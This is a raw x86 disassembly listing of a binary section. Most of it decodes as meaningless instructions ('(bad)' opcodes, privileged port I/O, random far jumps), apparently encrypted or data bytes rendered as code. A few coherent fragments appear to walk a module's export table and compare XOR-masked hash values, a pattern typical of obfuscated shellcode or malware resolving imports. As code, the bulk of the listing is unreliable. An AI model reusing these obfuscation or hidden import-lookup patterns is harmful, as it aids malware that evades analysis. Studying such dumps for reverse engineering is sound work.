  40b473:	(bad)  
  40b474:	xor    bl,BYTE PTR [esi-0x4ccd857c]
  40b47a:	shl    DWORD PTR [ebx],1
  40b47c:	rcl    BYTE PTR [ecx],0xf
  40b47f:	push   edx
  40b480:	ds inc eax
  40b482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b483:	cmp    bh,bh
  40b485:	dec    eax
  40b486:	js     0x40b467
  40b488:	push   ebp
  40b489:	cmp    DWORD PTR [esi],edx
  40b48b:	mov    es,WORD PTR [edx]
  40b48d:	xchg   edx,eax
  40b48e:	retf   0xcdcc
  40b491:	pop    edi
  40b492:	xchg   edx,eax
  40b493:	ins    DWORD PTR es:[edi],dx
  40b494:	adc    al,0x9f
  40b496:	xor    eax,0x5aaa3979
  40b49b:	inc    ecx
  40b49c:	neg    DWORD PTR [eax-0x56]
  40b49f:	xlat   BYTE PTR ds:[ebx]
  40b4a0:	inc    eax
  40b4a1:	push   0x1d
  40b4a3:	mov    bh,0x46
  40b4a5:	mov    eax,0xa5aaa3de
  40b4aa:	icebp  
  40b4ab:	cmp    BYTE PTR [esi],bh
  40b4ad:	mov    WORD PTR [ecx+0x6b],fs
  40b4b0:	xchg   ebx,eax
  40b4b1:	xchg   BYTE PTR [esi+0x62fb4586],bh
  40b4b7:	aam    0x6b
  40b4b9:	cwde   
  40b4ba:	das    
  40b4bb:	imul   esi,DWORD PTR [ebx+0x2132bc00],0x6e4fe65e
  40b4c5:	out    0x6f,eax
  40b4c7:	mov    ch,0x9c
  40b4c9:	loopne 0x40b4ca
  40b4cb:	add    DWORD PTR [ebx+0x5],esi
  40b4ce:	xor    DWORD PTR [ebx-0x2876e884],edx
  40b4d4:	xlat   BYTE PTR ds:[ebx]
  40b4d5:	mov    DWORD PTR [ebp-0x2c],ecx
  40b4d8:	mov    eax,DWORD PTR [ebp-0x14]
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	sar    BYTE PTR [ecx-0x35],0x77
  40b50b:	call   0x38bf3400
  40b510:	jl     0x40b590
  40b512:	jle    0x40b4d6
  40b514:	xor    dl,BYTE PTR [edi-0x70]
  40b517:	jns    0x40b49a
  40b519:	test   al,0x64
  40b51b:	jno    0x40b4f6
  40b51d:	jo     0x40b583
  40b51f:	mov    WORD PTR [ebx+0x28e4f9b7],ss
  40b525:	les    esp,FWORD PTR [ebx-0x48]
  40b528:	imul   edi,edi,0xffffff83
  40b52b:	rcr    BYTE PTR [esi+0x6b],1
  40b52e:	jno    0x40b50d
  40b530:	inc    edi
  40b531:	adc    eax,0xb8663db7
  40b536:	adc    al,0x43
  40b538:	and    esp,DWORD PTR [eax-0x2b]
  40b53b:	es xor eax,0xe790d9e2
  40b541:	mov    eax,0x9c2584a3
  40b546:	xorps  xmm2,XMMWORD PTR [esi+0x57]
  40b54a:	adc    edi,edi
  40b54c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b54d:	cmp    ah,bl
  40b54f:	stos   DWORD PTR es:[edi],eax
  40b550:	push   0x2b
  40b552:	sub    eax,0x2d484592
  40b557:	imul   ecx,DWORD PTR [esi+0x69],0x66ce0b94
  40b55e:	pop    eax
  40b55f:	mov    eax,0xb2b213bf
  40b564:	lea    esi,[edi]
  40b566:	sti    
  40b567:	test   ebx,0x24a7c1f5
  40b56d:	mul    BYTE PTR [eax-0x5e]
  40b570:	mov    esp,0x59242890
  40b575:	sar    DWORD PTR [eax+0x40f095a3],1
  40b57b:	dec    edx
  40b57c:	xchg   ecx,eax
  40b57d:	(bad)  
  40b57e:	hlt    
  40b57f:	stos   DWORD PTR es:[edi],eax
  40b580:	inc    eax
  40b581:	call   esi
  40b583:	xchg   ecx,eax
  40b584:	push   esi
  40b585:	imul   esp,ebp,0x71
  40b588:	xchg   edx,eax
  40b589:	sub    al,0x22
  40b58b:	in     eax,dx
  40b58c:	sbb    BYTE PTR [edi-0x2],0xc1
  40b590:	jmp    0x9a4f037e
  40b595:	mov    ah,0x3e
  40b597:	or     esp,DWORD PTR [eax]
  40b599:	mov    ebp,0xcdfcda91
  40b59e:	push   0x67c95d7
  40b5a3:	int    0x9b
  40b5a5:	mov    dl,0xee
  40b5a7:	repnz inc edi
  40b5a9:	xchg   DWORD PTR [eax+0x18e9bfab],ebp
  40b5af:	adc    eax,0xa9ef36a5
  40b5b4:	sbb    BYTE PTR ds:[edi],dl
  40b5b7:	mov    ah,BYTE PTR [edx]
  40b5b9:	or     eax,0xd4ad1e56
  40b5be:	ror    BYTE PTR [esi],cl
  40b5c0:	and    al,0x87
  40b5c2:	inc    edi
  40b5c3:	dec    eax
  40b5c4:	xor    dl,ch
  40b5c6:	in     al,0x57
  40b5c8:	jbe    0x40b57f
  40b5ca:	jne    0x40b574
  40b5cc:	pop    es
  40b5cd:	sub    edx,ebx
  40b5cf:	xchg   ebp,eax
  40b5d0:	or     ch,ch
  40b5d2:	xchg   ebp,eax
  40b5d3:	arpl   WORD PTR [eax],di
  40b5d5:	jbe    0x40b60d
  40b5d7:	inc    esp
  40b5d8:	fst    DWORD PTR [edx-0x399ecdfb]
  40b5de:	cmc    
  40b5df:	rcl    BYTE PTR [ebx],0x76
  40b5e2:	retf   
  40b5e3:	sub    ebp,ecx
  40b5e5:	lds    edx,FWORD PTR [ecx+0x1b]
  40b5e8:	mov    ch,0xd9
  40b5ea:	pop    esi
  40b5eb:	aad    0x93
  40b5ed:	cmp    eax,0x5d9114f
  40b5f2:	(bad)  
  40b5f4:	(bad)  
  40b5f5:	sti    
  40b5f6:	shr    BYTE PTR [ebp-0x86b0d60],1
  40b5fc:	mov    esp,0x904d222c
  40b601:	pop    ecx
  40b602:	cli    
  40b603:	in     eax,dx
  40b604:	pop    esi
  40b605:	hlt    
  40b606:	out    dx,eax
  40b607:	or     eax,0x6084350
  40b60c:	loope  0x40b5a1
  40b60e:	cmp    DWORD PTR [edi+ebx*1],ebx
  40b611:	push   ds
  40b612:	cwde   
  40b613:	and    eax,0x4a7169e
  40b618:	js     0x40b626
  40b61a:	jnp    0x40b5b1
  40b61c:	in     al,0x6f
  40b61e:	stos   BYTE PTR es:[edi],al
  40b61f:	mov    al,0x5a
  40b621:	inc    edi
  40b622:	mov    ecx,0xce21ca41
  40b627:	mov    ds:0x2d21292f,eax
  40b62c:	popa   
  40b62d:	int3   
  40b62e:	je     0x40b61b
  40b630:	imul   eax,ebp,0xa33a705b
  40b636:	(bad)  
  40b637:	xchg   edx,eax
  40b638:	and    al,0x79
  40b63a:	inc    ebx
  40b63b:	cld    
  40b63c:	fmul   st(3),st
  40b63e:	cmp    DWORD PTR [esi],0x3dd10783
  40b644:	fldenv [ecx+0x1cbec057]
  40b64a:	stos   DWORD PTR es:[edi],eax
  40b64b:	ins    DWORD PTR es:[edi],dx
  40b64c:	mov    ebx,?
  40b64e:	sub    DWORD PTR [edi],ecx
  40b650:	mov    al,ds:0x42e4afc
  40b655:	and    cl,cl
  40b657:	and    eax,0x9c6e1851
  40b65c:	add    al,0x3
  40b65e:	scas   al,BYTE PTR es:[edi]
  40b65f:	je     0x40b6a8
  40b661:	out    0x15,al
  40b663:	leave  
  40b664:	loope  0x40b69f
  40b666:	pop    es
  40b667:	mov    ecx,0xaa59f1c9
  40b66c:	sub    DWORD PTR [ecx-0x737f32cb],0x4d1fa1af
  40b676:	mov    ebx,0x38d63374
  40b67b:	retf   
  40b67c:	push   ebx
  40b67d:	loopne 0x40b62a
  40b67f:	mov    ah,0x19
  40b681:	call   0xc59d:0x2cb921be
  40b688:	cdq    
  40b689:	call   0xbc386086
  40b68e:	jle    0x40b62b
  40b690:	mov    dl,0x6e
  40b692:	popa   
  40b693:	xchg   DWORD PTR [edx-0x38],edx
  40b696:	push   cs
  40b697:	fwait
  40b698:	arpl   WORD PTR [edx-0x20],ax
  40b69b:	pop    ss
  40b69c:	bound  ebx,QWORD PTR [ebx]
  40b69e:	or     eax,0x4f9b0c2f
  40b6a3:	rol    BYTE PTR [esp+edx*8],1
  40b6a6:	bound  esi,QWORD PTR [ebp-0x6c]
  40b6a9:	sti    
  40b6aa:	cmc    
  40b6ab:	push   esp
  40b6ac:	loopne 0x40b65e
  40b6ae:	lock or eax,0xae1eb446
  40b6b4:	pop    edi
  40b6b5:	not    DWORD PTR [ecx-0x77bafc56]
  40b6bb:	sub    esp,DWORD PTR [esi+eax*4+0x24675d7]
  40b6c2:	push   edi
  40b6c3:	sub    bl,al
  40b6c5:	scas   eax,DWORD PTR es:[edi]
  40b6c6:	sbb    DWORD PTR [esi+0x41],esi
  40b6c9:	lahf   
  40b6ca:	push   cs
  40b6cb:	mov    dl,0x50
  40b6cd:	mov    ecx,0x3ce15798
  40b6d2:	jbe    0x40b6be
  40b6d4:	call   0x2958:0xfe4c5668
  40b6db:	ins    BYTE PTR es:[edi],dx
  40b6dc:	push   eax
  40b6dd:	(bad)  
  40b6de:	push   eax
  40b6df:	jmp    0xbf7a8d0a
  40b6e4:	out    dx,al
  40b6e5:	popf   
  40b6e6:	add    DWORD PTR [eax+0x42],ecx
  40b6e9:	push   ebx
  40b6ea:	sub    esi,edi
  40b6ec:	mov    edx,esi
  40b6ee:	push   ebp
  40b6ef:	(bad)  
  40b6f0:	push   ds
  40b6f1:	pop    esi
  40b6f2:	inc    edx
  40b6f3:	lds    esi,FWORD PTR [ebx]
  40b6f5:	mov    edi,0xc017035f
  40b6fa:	in     al,0x87
  40b6fc:	xor    BYTE PTR [ebp+0x70afe9e4],dl
  40b702:	adc    al,0xa0
  40b704:	mov    esi,cr6
  40b707:	repnz pop esi
  40b709:	aaa    
  40b70a:	sub    ch,BYTE PTR [eax+edx*2-0x7e0bd0f9]
  40b711:	cwde   
  40b712:	cmp    DWORD PTR ds:0xcb20446a,edx
  40b718:	xlat   BYTE PTR ds:[ebx]
  40b719:	lods   eax,DWORD PTR ds:[esi]
  40b71a:	scas   eax,DWORD PTR es:[edi]
  40b71b:	pushf  
  40b71c:	imul   esi,DWORD PTR [edi],0x15649029
  40b722:	mov    edx,0xd134f5bc
  40b727:	push   0xffffff91
  40b729:	push   cs
  40b72a:	or     DWORD PTR [ebx+0x21],esi
  40b72d:	mov    WORD PTR [edi+0x972034e],cs
  40b733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b734:	mov    esi,0xbd327c2a
  40b739:	test   eax,0xdbf686d
  40b73e:	aam    0x3f
  40b740:	push   eax
  40b741:	addr16 test eax,0x91ba5646
  40b747:	sub    ch,al
  40b749:	scas   al,BYTE PTR es:[edi]
  40b74a:	xchg   esp,eax
  40b74b:	out    dx,eax
  40b74c:	mov    eax,0x5e80d47f
  40b751:	push   0x30
  40b753:	arpl   bx,cx
  40b755:	cmp    DWORD PTR [ebp+0x75ff5af4],ecx
  40b75b:	sar    bh,1
  40b75d:	jne    0x40b76b
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	dec    BYTE PTR [edx-0xe]
  40b78d:	adc    dh,BYTE PTR [edx+0x387e7efe]
  40b793:	jl     0x40b813
  40b795:	jle    0x40b7d8
  40b797:	mov    ebx,0x4e167bdd
  40b79c:	ss test al,0x13
  40b79f:	push   0xfffffffb
  40b7a1:	aas    
  40b7a2:	ds pop edi
  40b7a4:	test   eax,0xca0bf9f2
  40b7a9:	xor    bl,BYTE PTR [ebx]
  40b7ab:	test   esp,ebx
  40b7ad:	mov    edx,0x8da26e8b
  40b7b2:	cli    
  40b7b3:	pop    edx
  40b7b4:	adc    BYTE PTR [edi-0x474f2aac],al
  40b7ba:	mov    edi,0x81e4e1ff
  40b7bf:	(bad)  
  40b7c0:	push   ebx
  40b7c1:	dec    esi
  40b7c2:	ds out 0xf4,al
  40b7c5:	cmc    
  40b7c6:	add    ch,BYTE PTR [eax+ebx*8-0xbff6dde]
  40b7cd:	xor    al,0x77
  40b7cf:	retf   
  40b7d0:	or     esi,ecx
  40b7d2:	and    al,0x74
  40b7d4:	dec    edx
  40b7d5:	mov    ebp,0x707284e2
  40b7da:	pop    ebx
  40b7db:	cmc    
  40b7dc:	cmc    
  40b7dd:	jbe    0x40b7d8
  40b7df:	call   0xfc5184ad
  40b7e4:	lahf   
  40b7e5:	test   DWORD PTR [edx+0x337a9944],esi
  40b7eb:	inc    edi
  40b7ec:	pop    esi
  40b7ed:	dec    edx
  40b7ee:	out    dx,eax
  40b7ef:	clc    
  40b7f0:	inc    edx
  40b7f1:	jg     0x40b870
  40b7f3:	cld    
  40b7f4:	mov    ch,0x12
  40b7f6:	inc    edi
  40b7f7:	pop    edx
  40b7f8:	fldenv [ebx]
  40b7fa:	dec    ecx
  40b7fb:	call   0x893a:0x81fb5b44
  40b802:	cmp    al,0xc1
  40b804:	imul   DWORD PTR fs:[eax+0x79a27a86]
  40b80b:	popa   
  40b80c:	xor    BYTE PTR [ebp+ecx*4-0x19f6279],al
  40b813:	cld    
  40b814:	push   0xffffffe0
  40b816:	lahf   
  40b817:	xchg   esi,eax
  40b818:	jne    0x40b80a
  40b81a:	fwait
  40b81b:	imul   ebx,DWORD PTR [eax-0x66cc8605],0xb08e04bb
  40b825:	inc    edx
  40b826:	and    BYTE PTR [ebp+0x51ea9899],0x8f
  40b82d:	mov    edx,?
  40b82f:	js     0x40b80a
  40b831:	push   ds
  40b832:	sbb    esp,DWORD PTR [esi]
  40b834:	mov    fs,WORD PTR [edi]
  40b836:	ins    DWORD PTR es:[edi],dx
  40b837:	push   0xffffffd4
  40b839:	sub    DWORD PTR [edx+edi*1],esp
  40b83c:	arpl   WORD PTR [eax+0x23c08d9c],cx
  40b842:	add    al,0x96
  40b844:	lods   eax,DWORD PTR ds:[esi]
  40b845:	inc    ecx
  40b846:	push   ecx
  40b847:	(bad)  
  40b848:	fbld   TBYTE PTR ds:0x2841923c
  40b84e:	cmp    dh,BYTE PTR [esi+ecx*4+0x41fb870b]
  40b855:	xchg   ecx,eax
  40b856:	cmp    DWORD PTR [edx],esi
  40b858:	xchg   ecx,eax
  40b859:	dec    esi
  40b85a:	dec    ebp
  40b85b:	pop    ds
  40b85c:	(bad)  [ecx+0x4a]
  40b85f:	pop    eax
  40b860:	cmp    BYTE PTR [edi+0x59],ah
  40b863:	and    ebx,edx
  40b865:	mov    al,0xfd
  40b867:	push   eax
  40b868:	jmp    0xe0ce2fa5
  40b86d:	push   di
  40b86f:	mov    esp,0xdd5c549b
  40b874:	push   0xabc80c72
  40b879:	dec    ebx
  40b87a:	leave  
  40b87b:	sti    
  40b87c:	or     DWORD PTR [eax+eiz*2-0x2cde35a2],ebp
  40b883:	jne    0x40b87d
  40b885:	xor    BYTE PTR [edi+ecx*8],ah
  40b888:	push   ss
  40b889:	mov    dl,0x5b
  40b88b:	cli    
  40b88c:	adc    al,0x25
  40b88e:	sbb    ebx,edi
  40b890:	in     eax,dx
  40b891:	mov    ds:0xf5033e93,al
  40b896:	sub    al,0xcb
  40b898:	sub    ebp,DWORD PTR [edx]
  40b89a:	mov    DWORD PTR [ecx-0x7e],edi
  40b89d:	rcr    esp,cl
  40b89f:	mov    gs,esi
  40b8a1:	mov    edi,0x159a718d
  40b8a6:	pop    es
  40b8a7:	xor    edi,DWORD PTR [ebp+edi*4+0xa29c127]
  40b8ae:	sbb    DWORD PTR [eax-0x6e],esi
  40b8b1:	cmp    edx,ebp
  40b8b3:	mov    dh,0x51
  40b8b5:	mov    DWORD PTR ds:0xe3b813f1,edx
  40b8bb:	or     eax,0xcada9ec9
  40b8c0:	(bad)  
  40b8c1:	lahf   
  40b8c2:	stos   DWORD PTR es:[edi],eax
  40b8c3:	sbb    eax,0xd00a3266
  40b8c8:	das    
  40b8c9:	js     0x40b8b5
  40b8cb:	imul   ecx,DWORD PTR [ebx],0xffffff87
  40b8ce:	dec    ecx
  40b8cf:	in     al,0xc1
  40b8d1:	push   eax
  40b8d2:	add    dl,BYTE PTR [ecx+0x5f]
  40b8d5:	mov    ah,0xf0
  40b8d7:	fisub  DWORD PTR [eax-0x1088678c]
  40b8dd:	sbb    ebp,edi
  40b8df:	push   ebp
  40b8e0:	js     0x40b8fb
  40b8e2:	fisub  WORD PTR [edx]
  40b8e4:	fdivr  st(5),st
  40b8e6:	mov    bl,0xda
  40b8e8:	xchg   ebp,eax
  40b8e9:	(bad)  [ebx+0x23]
  40b8ec:	push   esp
  40b8ed:	cmp    eax,0x1a288176
  40b8f2:	push   0xffffffcc
  40b8f4:	scas   al,BYTE PTR es:[edi]
  40b8f5:	ins    DWORD PTR es:[edi],dx
  40b8f6:	push   eax
  40b8f7:	mov    BYTE PTR [edx-0x64],dh
  40b8fa:	test   eax,0xdefd72f6
  40b8ff:	adc    edi,ebp
  40b901:	cmp    eax,0xb7ea7948
  40b906:	addr16 add al,0x9f
  40b909:	jl     0x40b8bb
  40b90b:	std    
  40b90c:	pop    ss
  40b90d:	xchg   BYTE PTR [eax+0x47],bh
  40b910:	push   esp
  40b911:	jl     0x40b8cf
  40b913:	sar    BYTE PTR [edi+0x56],1
  40b916:	sub    DWORD PTR [ecx+0x55354b63],ecx
  40b91c:	cmp    eax,0x645af4e8
  40b921:	inc    edi
  40b922:	adc    al,0xe2
  40b924:	cwde   
  40b925:	and    BYTE PTR [ebp-0x6e],0xcd
  40b929:	out    0xe,al
  40b92b:	push   edx
  40b92c:	mov    al,ds:0x1ef4bdae
  40b931:	add    esi,DWORD PTR [eax]
  40b933:	and    eax,0x600b0cbd
  40b938:	mov    dl,0x31
  40b93a:	xchg   edi,eax
  40b93b:	and    dh,BYTE PTR [eax+0x56]
  40b93e:	xor    al,0xca
  40b940:	add    DWORD PTR [ecx],edi
  40b942:	mov    al,ds:0x64a48b9c
  40b947:	and    dh,al
  40b949:	repnz pop ds
  40b94b:	push   ebx
  40b94c:	sub    cl,BYTE PTR [ecx+0xf]
  40b94f:	push   es
  40b950:	loop   0x40b939
  40b952:	mov    ds:0xba0fa136,eax
  40b957:	cwde   
  40b958:	xor    ch,BYTE PTR [eax]
  40b95a:	aaa    
  40b95b:	scas   al,BYTE PTR es:[edi]
  40b95c:	push   eax
  40b95d:	xor    eax,0x3629a181
  40b962:	call   0x41b27f05
  40b967:	stos   BYTE PTR es:[edi],al
  40b968:	sbb    eax,0x4565bb50
  40b96d:	sub    DWORD PTR [eax+0x68],0xffffffc3
  40b971:	lahf   
  40b972:	(bad)  
  40b973:	push   esp
  40b974:	addr16 fwait
  40b976:	loope  0x40b944
  40b978:	in     al,0x42
  40b97a:	xor    eax,DWORD PTR [eax-0x11]
  40b97d:	loopne 0x40b937
  40b97f:	jl     0x40b9b7
  40b981:	jecxz  0x40b962
  40b983:	cli    
  40b984:	mov    ds:0xc69238ca,eax
  40b989:	push   edx
  40b98a:	add    eax,0x8d808825
  40b98f:	sbb    cl,BYTE PTR [ecx-0x71]
  40b992:	adc    ecx,ebp
  40b994:	ret    0x819f
  40b997:	test   BYTE PTR [edx-0x37],cl
  40b99a:	mul    cl
  40b99c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b99d:	loopne 0x40ba07
  40b99f:	cli    
  40b9a0:	das    
  40b9a1:	push   esp
  40b9a2:	test   ah,0xcb
  40b9a5:	push   edx
  40b9a6:	call   0x3875:0x2ed342e1
  40b9ad:	stos   DWORD PTR es:[edi],eax
  40b9ae:	mov    ecx,0xefe4bccc
  40b9b3:	jnp    0x40b95e
  40b9b5:	inc    ebx
  40b9b6:	jno    0x40b99f
  40b9b8:	xor    ebp,ebx
  40b9ba:	pop    ds
  40b9bb:	repz das 
  40b9bd:	mov    ds:0xdd00d919,eax
  40b9c2:	shl    dl,1
  40b9c4:	outs   dx,DWORD PTR ds:[esi]
  40b9c5:	mov    dl,0x41
  40b9c7:	arpl   WORD PTR [edx+0x3b],bp
  40b9ca:	pusha  
  40b9cb:	out    dx,al
  40b9cc:	adc    DWORD PTR [edx-0x17],eax
  40b9cf:	(bad)  
  40b9d0:	sub    eax,0xca215507
  40b9d5:	lods   eax,DWORD PTR ds:[si]
  40b9d7:	dec    esi
  40b9d8:	(bad)  
  40b9d9:	jmp    0x47e0:0x458ba396
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8-0x2a4657f8],eax
  40ba0f:	rcr    ah,1
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	test   cl,0x23
  40ba1c:	add    ch,BYTE PTR [esi-0x22]
  40ba1f:	xchg   BYTE PTR [ebx],al
  40ba21:	out    0xdd,eax
  40ba23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba24:	xor    eax,0xe54ad0fc
  40ba29:	mov    ah,0x2e
  40ba2b:	lea    edi,[ebp-0x7dda8a05]
  40ba31:	jae    0x40b9cd
  40ba33:	leave  
  40ba34:	and    BYTE PTR [ebp-0x57],bh
  40ba37:	sbb    al,0xc8
  40ba39:	mov    al,BYTE PTR [ebx-0x379e4198]
  40ba3f:	(bad)  
  40ba41:	icebp  
  40ba42:	or     DWORD PTR [edi+0xde7ded],ebp
  40ba48:	sbb    edx,ebx
  40ba4a:	pop    ecx
  40ba4b:	std    
  40ba4c:	shl    DWORD PTR ds:0x60b76c7f,0xb8
  40ba53:	loop   0x40b9f4
  40ba55:	mov    ebp,0xf5260c0e
  40ba5a:	ss jp  0x40badc
  40ba5d:	int3   
  40ba5e:	push   esp
  40ba5f:	sub    al,0x65
  40ba61:	inc    edx
  40ba62:	sub    edi,DWORD PTR [ecx]
  40ba64:	fild   QWORD PTR [ebx-0x5d35ae96]
  40ba6a:	push   ss
  40ba6b:	aas    
  40ba6c:	cmp    eax,0xa085f700
  40ba71:	das    
  40ba72:	cmp    DWORD PTR [eax+0xb],0x6c6ea466
  40ba79:	test   eax,0x6853310b
  40ba7e:	loope  0x40ba3d
  40ba80:	das    
  40ba81:	xchg   ch,dh
  40ba83:	test   cl,bl
  40ba85:	jo     0x40ba69
  40ba87:	add    al,0x2
  40ba89:	jne    0x40ba2a
  40ba8b:	repnz add dh,BYTE PTR [ebx-0x63]
  40ba8f:	dec    esi
  40ba90:	jl     0x40ba55
  40ba92:	(bad)  
  40ba93:	jmp    0xcad5:0xdc2c8383
  40ba9a:	(bad)
  40ba9d:	mov    edx,0x9516a59b
  40baa2:	retf   0x977e
  40baa5:	dec    esi
  40baa6:	xor    eax,0x6da9c5ef
  40baab:	inc    esp
  40baac:	fist   WORD PTR [ecx-0xd2f3df3]
  40bab2:	std    
  40bab3:	(bad)  
  40bab4:	pop    edi
  40bab5:	enter  0x9f1e,0x38
  40bab9:	add    dh,BYTE PTR ds:0x7ff3b1f0
  40babf:	lods   al,BYTE PTR ds:[esi]
  40bac0:	jecxz  0x40bac4
  40bac2:	test   al,0x0
  40bac4:	(bad)  
  40bac5:	dec    eax
  40bac6:	xchg   ebx,eax
  40bac7:	mov    cl,0xbd
  40bac9:	(bad)  
  40baca:	push   ecx
  40bacb:	xchg   esi,eax
  40bacc:	js     0x40baec
  40bace:	jl     0x40ba6e
  40bad0:	mov    esp,0x5609fa53
  40bad5:	repnz cmc 
  40bad7:	xor    al,BYTE PTR [edx+0x4f02617f]
  40badd:	push   ecx
  40bade:	mov    esp,0x68b63e6e
  40bae3:	xchg   DWORD PTR [edi],edx
  40bae5:	js     0x40bb51
  40bae7:	aaa    
  40bae8:	jmp    0x15c7dfdd
  40baed:	sbb    dh,BYTE PTR [edi]
  40baef:	stos   BYTE PTR es:[edi],al
  40baf0:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40baf2:	push   es
  40baf3:	mov    ds:0xb5f3f96b,eax
  40baf8:	fmul   DWORD PTR [ecx+0x6c]
  40bafb:	mov    esp,0x325d06a1
  40bb00:	adc    al,0xf8
  40bb02:	scas   eax,DWORD PTR es:[edi]
  40bb03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb04:	or     BYTE PTR [ebx+0x51d66448],0xd6
  40bb0b:	mov    ch,0xc6
  40bb0d:	loop   0x40bb68
  40bb0f:	xchg   ebp,eax
  40bb10:	pop    ss
  40bb11:	scas   al,BYTE PTR es:[edi]
  40bb12:	out    dx,al
  40bb13:	popa   
  40bb14:	push   ebp
  40bb15:	push   ebp
  40bb16:	loop   0x40bb59
  40bb18:	gs shl ch,cl
  40bb1b:	pop    edx
  40bb1c:	retf   
  40bb1d:	imul   esp,edi,0xf0690e77
  40bb23:	pop    esp
  40bb24:	mov    cx,0x8c7a
  40bb28:	xchg   DWORD PTR ds:0xd439ab47,esi
  40bb2e:	ins    BYTE PTR es:[edi],dx
  40bb2f:	push   ecx
  40bb30:	xchg   edx,eax
  40bb31:	cld    
  40bb32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb33:	aaa    
  40bb34:	and    DWORD PTR [esi-0x7055d62b],esi
  40bb3a:	scas   eax,DWORD PTR es:[edi]
  40bb3b:	jns    0x40bada
  40bb3d:	fstp   QWORD PTR [ebp-0x6c6fb50a]
  40bb43:	daa    
  40bb44:	mov    eax,0xeafe3ce
  40bb49:	mov    ch,0x22
  40bb4b:	sub    al,0xa6
  40bb4d:	out    0x85,eax
  40bb4f:	pop    esi
  40bb50:	fnstsw WORD PTR [esi+0x5c5f91a4]
  40bb56:	and    eax,0xf74c8aeb
  40bb5b:	test   eax,0x3aa01df0
  40bb60:	xor    BYTE PTR [eax+0x30e57049],ch
  40bb66:	pop    esp
  40bb67:	bound  ebx,QWORD PTR [ecx-0x302cc8f6]
  40bb6d:	aas    
  40bb6e:	(bad)  
  40bb6f:	iret   
  40bb70:	sub    ebx,DWORD PTR [ebp+0x77010307]
  40bb76:	scas   al,BYTE PTR es:[edi]
  40bb77:	mov    ds:0xeeca104f,al
  40bb7c:	push   0xa9a2636b
  40bb81:	add    edx,ecx
  40bb83:	jmp    0xb615:0x944fb6a4
  40bb8a:	cmp    BYTE PTR [edi-0x33],ch
  40bb8d:	enter  0x7739,0x59
  40bb91:	jg     0x40bb6a
  40bb93:	xor    DWORD PTR [esi],edx
  40bb95:	cli    
  40bb96:	and    esi,esp
  40bb98:	jg     0x40bb65
  40bb9a:	jg     0x40bba8
  40bb9c:	arpl   WORD PTR [edx-0x73],bx
  40bb9f:	sbb    DWORD PTR [ecx+ebp*1+0x25],esp
  40bba3:	xor    ch,al
  40bba5:	popa   
  40bba6:	inc    ebx
  40bba7:	xchg   ebp,eax
  40bba8:	lds    ecx,FWORD PTR [esi-0x5e]
  40bbab:	adc    eax,0x5618290
  40bbb0:	int    0x41
  40bbb2:	ins    BYTE PTR es:[edi],dx
  40bbb3:	inc    edx
  40bbb4:	pop    eax
  40bbb5:	in     eax,0x5c
  40bbb7:	dec    ecx
  40bbb8:	jo     0x40bbd4
  40bbba:	mov    ch,0x49
  40bbbc:	popf   
  40bbbd:	leave  
  40bbbe:	xor    BYTE PTR [eax-0x15],bh
  40bbc1:	inc    ebx
  40bbc2:	pop    es
  40bbc3:	cmp    cl,BYTE PTR [edx-0x1e]
  40bbc6:	inc    ecx
  40bbc7:	les    esi,FWORD PTR [ecx]
  40bbc9:	dec    ebp
  40bbca:	add    ch,BYTE PTR [ebx]
  40bbcc:	ds jmp 0x4efc3a64
  40bbd2:	sbb    edi,DWORD PTR [esi-0x23]
  40bbd5:	add    DWORD PTR [edi+0x3d87cb06],eax
  40bbdb:	pop    esp
  40bbdc:	enter  0xcb0e,0x85
  40bbe0:	xor    edx,DWORD PTR [ebx-0x4]
  40bbe3:	retf   0x72c8
  40bbe6:	loop   0x40bc1b
  40bbe8:	cli    
  40bbe9:	inc    esp
  40bbea:	test   BYTE PTR [esi+edx*4-0x4554b539],al
  40bbf1:	adc    dl,bl
  40bbf3:	jbe    0x40bc1f
  40bbf5:	jno    0x40bc3c
  40bbf7:	push   edi
  40bbf8:	dec    ebx
  40bbf9:	mov    cl,0xc1
  40bbfb:	dec    eax
  40bbfc:	mov    cl,0x62
  40bbfe:	call   0x37633201
  40bc03:	out    0x21,al
  40bc05:	stc    
  40bc06:	mov    bh,0xb9
  40bc08:	cmp    DWORD PTR [ecx-0x569d1a3a],0x15e7f034
